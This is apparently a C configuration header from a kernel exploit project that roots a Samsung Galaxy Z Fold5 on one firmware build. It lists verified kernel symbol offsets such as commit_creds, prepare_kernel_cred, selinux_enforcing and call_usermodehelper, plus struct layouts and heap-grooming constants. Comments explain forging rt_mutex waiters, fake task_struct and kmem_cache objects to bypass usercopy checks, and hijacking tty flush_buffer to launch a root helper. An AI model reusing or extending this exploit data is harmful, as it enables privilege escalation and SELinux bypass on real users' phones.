#ifndef OFFSET_H
#define OFFSET_H

/*
 * ===========================================================================
 * FOLD5 (SM-F946B) — MCAST/tracefs/shaped-reclaim engine target
 *
 * Kernel: 5.15.189-android13-8-33404244-abF946BXXS7GZE5
 * SoC: Qualcomm Snapdragon 8 Gen 2 (SM8550-AC / Kalama)
 *
 * All offsets verified against recovered vmlinux.elf + vmlinux.btf from the
 * exact F946BXXS7GZE5 boot.img (SHA-256 2573036fbd2b...).
 *
 * Engine: PR #223 MCAST/tracefs/shaped-reclaim (johnny-salz).
 * Geometry derived from f946b kernel source:
 *   sizeof(skb_shared_info) = 0x158 (BTF)
 *   SKB_DATA_ALIGN(sizeof(skb_shared_info)) = 0x180 (SMP_CACHE_BYTES=64)
 *   SKB_MAX_HEAD(0) = 0x1000 - 0x180 = 0xe80
 *   UNIX_SKB_FRAGS_SZ = PAGE_SIZE << get_order(32768) = 0x8000
 *   SKB_SEND_SIZE = 0xe80 + 0x8000 = 0x8e80
 *   SKB_DATA_DELTA = -0xe80
 *
 * Tracefs callers (IDA disassembly):
 *   worker_thread: BL schedule at 0x10db40, ret 0x10db44
 *   wait_for_vfork_done: BL wait_for_common at 0xc8fe0, ret 0xc8fe4
 * ===========================================================================
 */

#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x400
#endif

/*
 * Choreography core policy (device-verified, see src/affinity.h): the
 * futex-collision channel is calibrated to the LITTLE pair (0,1) and the
 * waiter stage stays unpinned; cores are compile-time literals in
 * common.h. The Cortex-X3 prime (cpu7) rejects affinity outright on this
 * firmware (restricted-core EINVAL). Background actors (stability keeper)
 * run on the probe-permitted perf mask via pin_perf_mask() after root.
 */

/*
 * Choreography core policy (2026-08-27 stability rework).
 * RMG_PIN_TEST_PRIME=1 enables runtime pair resolution (src/util.c
 * rmg_select_pair): the choreography core AND the consumer core are
 * chosen together from the A715 cluster (cpu3-6) so both are legally
 * pinnable at attempt time — codegen is -mtune=cortex-a715 and the
 * collision channel is perf-calibrated (2048 pile-up, x5 threshold).
 * The X3 prime (cpu7) is no longer preferred: firmware revokes it
 * mid-run and it mismatches the tune. Samsung PM migrates tasks between
 * cpusets (top-app 0-7 -> foreground 0-6 -> background 0-2), so the
 * pair is re-validated at every attempt and again right before the
 * pi-futex write stage (rmg_pin_gate_ready); when no perf-core pair is
 * legal the attempt fails CLEANLY instead of running unpinned into the
 * ~50% kernel-panic coin flip (observed 2026-08-26: resolve cpu=7 ->
 * revalidate cpu=5 -> consumer pin cpu=6 EINVAL -> unpinned -> panic).
 * The write-stage main thread stays on the LITTLE-calibrated literal
 * (main.c fops block). Background actors use src/affinity.h after root.
 */
#define RMG_PIN_TEST_PRIME 1

#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3

#define MM_ORDER 3
#define KSNITCH_COLLISIONS 4
#define KERNELSNITCH_VERBOSE 1
#define KERNELSNITCH_MTE_ENABLED 0
#define KERNELSNITCH_THRESHOLD_MULT 5
#define FAKE_WAITER_PRIO 130
#define PSELECT_ENTER_DELAY_USEC 50000

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define SLIDE_MCAST_DOMAIN AF_INET6
#define SLIDE_MCAST_LEVEL IPPROTO_IPV6
#define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define BUILD_VARIANT_LABEL "f946b-F946BXXS7GZE5-tracefs-shaped-configfs-pipe-root"
#define APP_PHYS_P0_ORACLE 1
#define APP_TRACEFS_SLIDE 1
#define APP_CLOSED_FOPS_ROUTE 1
#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
#define APP_FOPS_ROUTE_COARSE_DELAY_USEC 50000
#define APP_FOPS_ROUTE_FINE_DELAY_TICKS \
  0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
#define APP_FOPS_BEFORE_PIPE 1
#define APP_EXACT_PIPE_BUFFER_ONLY 1
#define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
#define APP_ROOT_REF_HOLDER_REQUIRED 0
#define DEFAULT_EXPLOIT_ATTEMPTS 8
#else
#define BUILD_VARIANT_LABEL "f946b-F946BXXS7GZE5-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/q5qxxx/q5q:16/BP4A.251205.006/F946BXXS7GZE5:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET 0x80000000ULL
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
#endif

/* SKB geometry: sizeof(skb_shared_info)=0x158, aligned=0x180, head=0xe80 */
#define SKB_DATA_DELTA (-0xe80LL)
#define SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 64
#define APP_SLIDE_RECLAIM_SENDS 64
#define PIPE_MAX_ATTEMPTS 12

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 0ULL
#define SLIDE_WAIT_NSEC 2000000000L
#define SLIDE_REQUEUE_ARM_USEC 20000
#define SLIDE_USE_FAKE_TASK 1
#define LEGACY_RT_MUTEX_WAITER 0
#define COMPACT_RT_MUTEX_WAITER 1
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_TRACEFS_EVENT_ID 108
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010db44ULL
#define SLIDE_TRACEFS_VFORK_CALLER_OFF 0x000c8fe4ULL
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define SLIDE_STACK_WRITER_MCAST 1
#define SLIDE_STACK_WRITER_SIGRETURN 2
#ifndef SLIDE_STACK_WRITER
#error F946B stack writer must be set by the build
#endif
#define MCAST_WAITER_OFF 0x78
#define SIGRETURN_FPSIMD_WAITER_OFF 0x18
#define SIGRETURN_SVE_WAITER_OFF 0x28
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/f946b-F946BXXS7GZE5/p0_fingerprint.h"
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
#define MM_NORMAL_ALIAS_END KERNELSNITCH_IDENTITY_END

#define APPENDED_FUTEXES 4096
#define REPEAT_MEASUREMENT 128
#define AVERAGE 8
#define KERNELSNITCH_BASELINE_SAMPLES 8
#define KERNELSNITCH_BASELINE_QUANTILE 1
#define S918_PAGE_SCAN_MAX 256
#define S918_KSNITCH_HINT_COLLISIONS 2
#define S918_KSNITCH_FULL_COLLISIONS 5
#define S918_DMA32_SKIP_SLABS 8
#define S918_TRIGGER_SLABS 24
#define S918_SKB_SENDS 256
#define S918_SKB_SNDBUF 8388608
#define S918_RECLAIM_SOCKET_PAIRS 32

/*
 * Symbol offsets — all verified via IDA lookup on recovered vmlinux.elf
 * (base 0xffffffc008000000). See docs/SM-F946B.md for full table.
 */
#define TASK_STRUCT_CRED_OFF      0x798ULL
#define TASK_STRUCT_REAL_CRED_OFF 0x790ULL
#define FAKE_TASK_TASK_GROUP_OFF  0x400ULL

#define INIT_TASK_OFF             0x02c05080ULL
#define PREPARE_KERNEL_CRED_OFF   0x0011e3c8ULL
#define COMMIT_CREDS_OFF          0x00120104ULL
#define OVERRIDE_CREDS_OFF        0x0011f1dcULL
#define ROOT_TASK_GROUP_OFF       0x02cb9ac0ULL
#define SELINUX_ENFORCING_OFF     0x02d8e5c0ULL
/* kmalloc_caches.
 *
 * This offset is 0xC0 (24 slots) PAST the real table start: reading 42 slots
 * from it yields the tail of the table (cgroup row slots 0..17) followed by
 * unrelated adjacent .bss (timestamps/counters), so the pipe cache gate never
 * matches. The real table start was located on-device via the kernel's own
 * alias invariant - kmalloc_caches_init() sets
 * kmalloc_caches[CGROUP][i] == kmalloc_caches[NORMAL][i], so a correct window
 * has slot10==slot24 and slot11==slot25 - and the unique offset reproducing the
 * known-good GZE5 values (slot10=ffffff80011d2780, slot11=ffffff80011d2900) is
 * this one minus 0xC0.
 *
 * The table base itself is deliberately NOT changed. After the pipe-page
 * preparation child has run, the ashmem-name AAR window no longer covers
 * addresses below this one - reading table-start-relative slot 10 faults the
 * kernel outright, while this address reads fine. Since the cgroup row aliases
 * the normal row, the two qwords at this offset ARE true slots 24/25 and
 * therefore also true slots 10/11, so two reads here recover every value the
 * gate needs. See pipe.c:pipe_reclaim_cache_gate(). */
#define KMALLOC_CACHES_OFF        0x020644f8ULL
/* anon_pipe_buf_ops. Measured on F946BXXS7GZH2, not inherited: every populated
 * pipe_buffer in the process's own pipes reports ops = KIMAGE_TEXT_BASE +
 * 0x01e7f420 (0xffffffc00a06f420 on a typical boot), and the inherited 0x01e7f4e0 was
 * 0xc0 too high - so no buffer ever matched. Confirmed across ~2112 buffers on fds
 * 31-137 with 65 non-empty, all agreeing on the same address. */
#define ANON_PIPE_BUF_OPS_OFF     0x01e7f420ULL

/* ---- Direct (deterministic) pipe-buffer walk -------------------------
 *
 * ALL of the following were read out of the raw BTF blob embedded in the
 * F946BXXS7GZH2 kernel Image (kernel offset 0x21ef2ac, 6094556 bytes, BTF
 * v1), i.e. measured from the exact firmware this payload runs on, not
 * copied and not assumed. BTF stores member offsets in BITS; the byte values
 * below are those divided by 8.
 *
 *   struct task_struct      size 0x1200  tasks 0x4d0  pid 0x5d8  files 0x7d8
 *                                       real_cred 0x790  cred 0x798  usage 0x38
 *   struct file             size 0x108   private_data 0xd8  f_op 0x28
 *   struct pipe_inode_info  size 0x0b8   head 0x60  tail 0x64  max_usage 0x68
 *                                       ring_size 0x6c  bufs 0xa8  tmp_page 0x90
 *   struct pipe_buffer      size 0x28    page 0x00 offset 0x08 len 0x0c
 *                                       ops 0x10 flags 0x18 private 0x20
 *   struct kmem_cache       size 0x108   size 0x18 object_size 0x1c align 0x50
 *                                       useroffset 0xf4 usersize 0xf8
 *
 * files_struct and fdtable are not exported to BTF, so FILES_FDT_OFF and
 * FDTABLE_FD_OFF are derived from include/linux/fdtable.h in the matching
 * 5.15.189-android13 source tree (atomic_t count; bool resize_in_progress;
 * wait_queue_head_t resize_wait; then fdt) and are additionally proved at
 * runtime by the fdtable invariants.
 *
 * Every value is re-checked before it is dereferenced, so a wrong one makes the
 * walk return 0 rather than fault the kernel.
 */
#define PIPE_WALK_TASK_TASKS_OFF   0x4d0ULL
#define PIPE_WALK_TASK_PID_OFF     0x5d8ULL
#define PIPE_WALK_TASK_FILES_OFF   0x7d8ULL
#define PIPE_WALK_FILES_FDT_OFF    0x20ULL
#define PIPE_WALK_FDTABLE_MAX_FDS  0x00ULL
#define PIPE_WALK_FDTABLE_FD_OFF   0x08ULL
#define PIPE_WALK_FILE_PRIVATE_OFF 0xd8ULL
#define PIPE_WALK_PIPE_HEAD_OFF    0x60ULL
#define PIPE_WALK_PIPE_TAIL_OFF    0x64ULL
#define PIPE_WALK_PIPE_RING_OFF    0x6cULL
#define PIPE_WALK_PIPE_BUFS_OFF    0xa8ULL
#define PIPE_WALK_MAX_STEPS        16384
/* Separate budget for the step-back retry in the task walk. That path does `i--`, which
 * the loop's `i++` cancels, so PIPE_WALK_MAX_STEPS is not enforced there. */
#define PIPE_WALK_MAX_RETRIES     8

/* Cleared band inside the reclaimed ORDER3 page that pipe_walk_prove_descriptors() uses
 * as its proof target. It must not overlap anything the payload already occupies there:
 * the fake file_operations (+0x1180), the CFI scratch, the synthetic kmem_cache
 * descriptor, the fake waiters, or the root-stage work/data at +0x6000 / +0x6200.
 * +0x800 sits in the clear band below the fake fops table. */
#define PIPE_WALK_PROOF_OFF        0x800ULL
/* Must cover the longest proof tag (the write tag plus its NUL, currently 35). */
#define PIPE_WALK_PROOF_MAX        0x40ULL

/* fd scan cap and the pipe_buffer stride (page 0x00, offset 0x08, len 0x0c, ops 0x10,
 * flags 0x18, private 0x20 -> 0x28, per BTF/8). */
#define PIPE_WALK_MAX_FDS           512ULL
#define PIPE_WALK_PIPE_BUF_STRIDE   0x28ULL

/* Per-object guard cache sizes.
 *
 * The fake kmem_cache is built with size = object_size = inuse = usersize = cache_size,
 * so this value is the object size the guard is claiming to cover. The fork uses a
 * distinct value per object type; using one oversized value for everything made the
 * usercopy window far larger than the object, which is very likely why guarded reads
 * remained marginal. Values are the fork's, and task_struct/files_struct/file sizes
 * agree with the BTF measured from this firmware (task_struct 0x1200, file 0x108).
 *   task_struct 4608 (0x1200), files_struct 704 (0x2c0), file 320 (0x140)
 */
#define PIPE_WALK_TASK_CACHE_SIZE   4608ULL
#define PIPE_WALK_FILES_CACHE_SIZE  704ULL
/* Object sizes below are THIS device's real sizeof(), read out of its own vmlinux.btf - not
 * the reference fork's, which targets a different SoC. The guard works by installing a fake
 * kmem_cache whose size/inuse/usersize all equal the value passed here, so that the kernel's
 * own __check_heap_object() bounds test accepts our read span. Two consequences:
 *   - the value MUST cover the read span measured from the object start, or the read aborts;
 *   - it should NOT exceed the real object, because every extra byte widens the window in
 *     which a concurrent kernel allocation on that slab page is misled. That is the measured
 *     "one oversized value left reads marginal" failure.
 * BTF sizes: task_struct 4608, files_struct 704, file 264 (0x108), pipe_inode_info 184 (0xb8).
 * The pinfo read spans head@0x60..bufs@0xa8+8 = 0x60..0xb0 = 176 bytes, which fits 184 exactly. */
#define PIPE_WALK_FILE_CACHE_SIZE   264ULL
#define PIPE_WALK_PINFO_CACHE_SIZE  184ULL

/* Order-3 allocation: 8 pages. The reclaim pipes are sized to 32 slots, matching the
 * fork (TARGET_PIPE_SLOTS 32, TARGET_PIPE_COUNT 240). */
#define PIPE_WALK_PIPE_SLOTS        32ULL

/* Slab scan chunk, matching the fork's TARGET_PIPE_SCAN_CHUNK. The guard's synthetic
 * cache covers the read, so read width and cache size have to agree. */
#define PIPE_WALK_SCAN_CHUNK        0x400ULL

/* Root-stage TTY geometry. All values read out of the DEVICE BTF
 * (vmlinux.btf from F946BXXS7GZH2), not copied blindly from the fork's target.h - though
 * every one of them matches the fork exactly, which is a good cross-check that the BTF parse
 * and the ported constants describe the same kernel family.
 *
 *   struct tty_struct     size 0x340: magic@0x00 ops@0x18 index@0x20 SAK_work@0x2f8 port@0x328
 *   struct tty_operations size 0x118: flush_buffer@0xa8
 *   struct subprocess_info size 0x70 (112): work@0x00 complete@0x30 path@0x38 argv@0x40
 *                                     envp@0x48 wait@0x50 retval@0x54
 *                                     (so work_struct is 0x30 = 48 bytes here)
 *
 * Note this kernel's BTF names the field SAK_work, not sa_work; the offset is the same. */
#define TTY_FILE_TTY_OFF            0x00ULL
#define TTY_FILE_FILE_OFF           0x08ULL
#define TTY_MAGIC_OFF               0x00ULL
#define TTY_MAGIC                   0x5401U
#define TTY_OPS_OFF                 0x18ULL
#define TTY_INDEX_OFF               0x20ULL
#define TTY_SAK_WORK_OFF            0x2f8ULL
#define TTY_PORT_OFF                0x328ULL
#define TTY_OPS_SIZE                0x118U
/* struct tty_operations slot offsets, verified against this device's own vmlinux.btf
 * (BTF reports bit offsets; divided by 8 below). The struct is __randomize_layout in the
 * source header, so these must come from the running kernel's BTF and not from tty_driver.h. */
#define TTY_OPS_LOOKUP_OFF          0x00U
#define TTY_OPS_OPEN_OFF            0x18U
#define TTY_OPS_WRITE_OFF           0x38U
#define TTY_OPS_IOCTL_OFF           0x60U
#define TTY_OPS_FLUSH_BUFFER_OFF    0xa8U

#define WORK_DATA_OFF               0x00U
#define WORK_ENTRY_OFF              0x08U
#define WORK_FUNC_OFF               0x18U
#define WORK_PENDING_BIT            0x1ULL

#define UMH_SUBPROCESS_INFO_SIZE    112U
#define UMH_SUBPROCESS_WORK_SIZE    48U
#define UMH_SUBPROCESS_COMPLETE_OFF 48U
#define UMH_COMPLETION_SIZE         32U

/* Distance between consecutive `file` objects. Measured on device: the 240 reclaim
 * pipe files land in one slab at a fixed stride, which is what lets a single guarded
 * read cover many of them instead of one guard per fd. */
#define PIPE_WALK_FILE_STRIDE       0x100ULL

/* Cap on a single guarded span read. This bounds both the guard's cache size and the
 * AAR transfer; the fork keeps every read small, and the point of the run read is to
 * cut guard cycles, not to introduce a new width that might not be tolerated. */
#define PIPE_WALK_MAX_SPAN          0x2000ULL

#define SYSTEM_UNBOUND_WQ_OFF     0x02a90800ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001045d0ULL

/* tty SAK trigger, resolved from the Image's kallsyms (not guessed).
 *
 * do_SAK(tty) is drivers/tty/tty_io.c:3098, EXPORT_SYMBOL'd at L3104. It is what the root
 * stage installs into tty->ops->flush_buffer so that tty_driver_flush_buffer() ->
 * do_SAK() -> schedule_work(&tty->SAK_work) hands the borrowed work_struct to the real
 * workqueue machinery (locking, colour, counters, wake_up_worker) instead of us forging
 * those by hand.
 *
 * All three offsets verified against the device kallsyms table; 13 independent symbols
 * cross-checked exact (call_usermodehelper_exec_work 0x001045d0, system_unbound_wq
 * 0x02a90800, init_task 0x02c05080, root_task_group 0x02cb9ac0, anon_pipe_buf_ops
 * 0x01e7f420, configfs_read_iter, configfs_bin_write_iter, noop_llseek, prepare_kernel_cred,
 * commit_creds, override_creds, sysctl_bootid, random_table) with zero mismatches.
 * File offset equals the KIMAGE_TEXT_BASE-relative offset. */
#define DO_SAK_OFF                 0x000bb8728ULL
#define DO_SAK_WORK_OFF            0x000bb5f14ULL

#define ASHMEM_FOPS_OFF           0x0200d538ULL
#define ASHMEM_MISC_FOPS_OFF      0x02bfcf28ULL
#define ASHMEM_IOCTL_OFF          0x0114c6dcULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x0114cd38ULL
#define ASHMEM_MMAP_OFF           0x0114cd90ULL
#define ASHMEM_OPEN_OFF           0x0114d070ULL
#define ASHMEM_RELEASE_OFF        0x0114d108ULL
#define ASHMEM_SHOW_FDINFO_OFF    0x0114d224ULL
#define CONFIGFS_READ_ITER_OFF    0x005d7420ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005d7e48ULL
#define COPY_SPLICE_READ_OFF      0x00528198ULL
#define NOOP_LLSEEK_OFF           0x004bbd34ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)

/* tty SAK trigger, used by the PTY root stage: installed into tty->ops->flush_buffer so
 * tty_driver_flush_buffer() -> do_SAK() -> schedule_work(&tty->SAK_work) hands our borrowed
 * work_struct to the real workqueue machinery. Offsets resolved from the device kallsyms
 * and cross-checked on 13 other symbols with zero mismatches - see MEMORY.md. */
#define DO_SAK (KIMAGE_TEXT_BASE + DO_SAK_OFF)
#define DO_SAK_WORK (KIMAGE_TEXT_BASE + DO_SAK_WORK_OFF)

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01d5dd0eULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02a91e48ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02bba8c0ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02e6c0b1ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_PRIO_OFF 0x44
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_WW_CTX_OFF 0x50
#define FAKE_WAITER_LAYOUT_SIZE 0x58

#define FAKE_TASK_USAGE_OFF 0x38
#define FAKE_TASK_PRIO_OFF 0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
#define FAKE_TASK_PI_LOCK_OFF 0x884
#define FAKE_TASK_PI_WAITERS_OFF 0x898
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8a8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0

#define CFG_PAGE_OFF 16
/* configfs_buffer (fs/configfs/file.c:29-47, BTF sizeof 0x80):
 *   count 0x00  pos 0x08  page 0x10  ops 0x18  mutex 0x20 (sizeof 0x30)  needs_read_fill 0x50
 * The ashmem name lands at configfs_buffer + ASHMEM_NAME_PREFIX_LEN(11), so a control-blob
 * byte i is at struct offset i+11. mutex MUST arrive as 48 zero bytes: configfs_read_iter
 * does mutex_lock(&buffer->mutex) first (file.c:86) and with CONFIG_DEBUG_MUTEXES=n
 * MUTEX_WARN_ON expands to nothing, so a bogus owner hangs with no oops. */
#define CFG_MUTEX_OFF 32
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34

/* WORK_DATA_OFF / WORK_ENTRY_OFF / WORK_FUNC_OFF are defined above, verified against this
 * device's BTF (struct work_struct: data=0x00, entry=0x08, func=0x18, size=0x30). */

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_FLAGS_OFF 0x00
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

/* PageSlab() mask. From the BTF enum pageflags of THIS kernel's own vmlinux.btf, after
 * config resolution: PG_locked 0, PG_referenced 1, PG_uptodate 2, PG_dirty 3, PG_lru 4,
 * PG_active 5, PG_workingset 6, PG_waiters 7, PG_error 8, PG_slab 9. So bit 9, 0x200 -
 * NOT bit 1, which is PG_referenced and would pass on every hot page.
 *
 * Guarding this matters because struct page's 5-word union aliases slab_cache (+0x18)
 * with mapping on a pagecache page, and with compound_dtor/order/mapcount/nr on a
 * compound tail page. Writing our fake cache pointer into either is silent corruption. */
#define STRUCT_PAGE_SLAB_FLAG 0x200ULL

/* PG_head, bit 16 of enum pageflags. Set on the HEAD page of a compound allocation, so
 * together with the compound_head bit-0 protocol it tells a standalone page from a tail
 * page. A tail page is neither a slab head nor a standalone allocation: it has no
 * kmem_cache to redirect, and +0x18 aliases compound_dtor/order/mapcount/nr, so writing
 * our fake cache pointer there is silent corruption. */
#define STRUCT_PAGE_COMPOUND_HEAD_FLAG 0x10000ULL

/* slab_cache_guard support (port of the soumarcelino fork).
 *
 * On F946BXXS7GZH2 the ashmem-name AAR can WRITE any direct-map address but a READ of
 * one panics the kernel - measured, including at a live pointer handed to us by
 * kmalloc_caches. The fork sidesteps this by first pointing the object's slab_cache at
 * a synthetic kmem_cache whose usercopy region spans the whole object, which makes the
 * subsequent read legal. See slab_cache_guard_begin/end() in src/pipe.c.
 *
 * kmem_cache field offsets below are from the BTF blob in this firmware's own kernel
 * Image (bits/8): size 0x18, object_size 0x1c, inuse/align 0x50, useroffset 0xf4,
 * usersize 0xf8. Descriptor size 0x108 is the full struct kmem_cache. */
#define KMEM_CACHE_SIZE_OFF 0x18ULL
#define KMEM_CACHE_OBJECT_SIZE_OFF 0x1cULL
#define KMEM_CACHE_INUSE_OFF 0x50ULL
#define KMEM_CACHE_ALIGN_OFF 0x54ULL
#define KMEM_CACHE_USEROFFSET_OFF 0xf4ULL
#define KMEM_CACHE_USERSIZE_OFF 0xf8ULL
#define KMEM_CACHE_DESC_SIZE 0x108ULL

/* Where the synthetic kmem_cache lives inside our own payload page. The payload page
 * is a direct-map address we can write, which is exactly the capability the guard
 * needs. Kept clear of the fops table and the scratch area. */
#define FAKE_KMEM_CACHE_LIVE_OFF 0x3a00ULL

#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
